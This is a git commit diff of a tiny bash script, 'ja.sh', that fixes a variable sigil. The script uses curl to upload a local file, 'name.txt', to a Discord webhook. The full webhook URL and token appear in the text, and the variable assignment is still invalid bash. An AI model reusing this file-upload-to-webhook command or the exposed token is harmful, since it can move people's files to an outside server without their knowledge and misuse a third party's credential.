842a964e65a0885ba11616bfcb8c7353ec62884c
Dada <david.kondziella@rub.de>
2023-12-07 02:01:46 +0100

    Update ja.sh

--- ja.sh
+++ ja.sh
@@ -1,3 +1,3 @@
 #!/bin/bash  
-&WEBHOOK = "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+$WEBHOOK = "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 curl -F "file1=@name.txt" $WEBHOOK
